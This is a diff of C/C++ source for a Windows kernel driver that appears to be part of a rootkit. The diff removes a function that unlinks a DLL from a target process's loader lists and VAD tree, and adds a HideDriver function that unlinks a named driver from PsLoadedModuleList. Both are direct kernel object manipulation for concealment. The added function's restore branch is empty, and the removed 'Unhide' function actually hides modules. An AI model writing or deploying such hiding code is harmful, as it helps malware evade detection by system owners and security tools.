@@ -469,85 +469,41 @@ NTSTATUS MemoryUtils::HideModule(HiddenModuleInformation* ModuleInformation) {
 
 /*
 * Description:
-* HideModule is responsible for hiding user mode module that is loaded in a process.
+* HideDriver is responsible for hiding a kernel driver.
 *
 * Parameters:
-* @ModuleInformation [HiddenModuleInformation*] -- Required information, contains PID and module's name.
+* @DriverInformation [HiddenDriverInformation*] -- Required information, contains the driver's information.
 *
 * Returns:
 * @status			 [NTSTATUS]					-- Whether successfuly hidden or not.
 */
-NTSTATUS MemoryUtils::UnhideModule(HiddenModuleInformation* ModuleInformation) {
-	PLDR_DATA_TABLE_ENTRY pebEntry;
-	KAPC_STATE state;
-	NTSTATUS status = STATUS_UNSUCCESSFUL;
-	PEPROCESS targetProcess = NULL;
-	LARGE_INTEGER time = { 0 };
-	PVOID moduleBase = NULL;
-	time.QuadPart = -100ll * 10 * 1000;
+NTSTATUS MemoryUtils::HideDriver(HiddenDriverInformation * DriverInformation) {
+	PKLDR_DATA_TABLE_ENTRY loadedModulesEntry = NULL;
+	NTSTATUS status = STATUS_SUCCESS;
 
-	WCHAR* moduleName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR), DRIVER_TAG);
+	if (DriverInformation->Hide) {
+		status = STATUS_NOT_FOUND;
 
-	if (!moduleName)
-		return status;
+		for (PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
+			pListEntry != &PsLoadedModuleList->InLoadOrderLinks;
+			pListEntry = pListEntry->Flink) {
 
-	memcpy(moduleName, ModuleInformation->ModuleName, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR));
+			loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 
-	// Getting the process's PEB.
-	status = PsLookupProcessByProcessId(ULongToHandle(ModuleInformation->Pid), &targetProcess);
-
-	if (!NT_SUCCESS(status)) {
-		ExFreePoolWithTag(moduleName, DRIVER_TAG);
-		return status;
-	}
-
-	KeStackAttachProcess(targetProcess, &state);
-	PREALPEB targetPeb = (PREALPEB)PsGetProcessPeb(targetProcess);
-
-	if (!targetPeb) {
-		KeUnstackDetachProcess(&state);
-		ExFreePoolWithTag(moduleName, DRIVER_TAG);
-		return STATUS_ABANDONED;
-	}
-
-	for (int i = 0; !targetPeb->LoaderData && i < 10; i++) {
-		KeDelayExecutionThread(KernelMode, FALSE, &time);
-	}
-
-	if (!targetPeb->LoaderData) {
-		KeUnstackDetachProcess(&state);
-		ExFreePoolWithTag(moduleName, DRIVER_TAG);
-		return STATUS_ABANDONED_WAIT_0;
-	}
-
-	// Finding the module inside the process.
-	status = STATUS_NOT_FOUND;
-
-	for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
-		pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
-		pListEntry = pListEntry->Flink) {
-
-		pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-
-		if (pebEntry->FullDllName.Length > 0) {
-			if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleName, pebEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
-				moduleBase = pebEntry->DllBase;
-				RemoveEntryList(&pebEntry->InLoadOrderLinks);
-				RemoveEntryList(&pebEntry->InInitializationOrderLinks);
-				RemoveEntryList(&pebEntry->InMemoryOrderLinks);
-				RemoveEntryList(&pebEntry->HashLinks);
+			KdPrint((DRIVER_PREFIX "%ws\n", loadedModulesEntry->FullDllName.Buffer));
+			if (_wcsnicmp(loadedModulesEntry->FullDllName.Buffer, DriverInformation->DriverName,
+							loadedModulesEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
+				// Copying the original entry to make sure it can be restored again.
+				RemoveEntryList(&loadedModulesEntry->InLoadOrderLinks);
 				status = STATUS_SUCCESS;
 				break;
 			}
 		}
 	}
+	else {
+		
+	}
 
-	KeUnstackDetachProcess(&state);
-
-	if (NT_SUCCESS(status))
-		status = VadHideObject(targetProcess, (ULONG_PTR)moduleBase);
-
-	ExFreePoolWithTag(moduleName, DRIVER_TAG);
 	return status;
 }
 
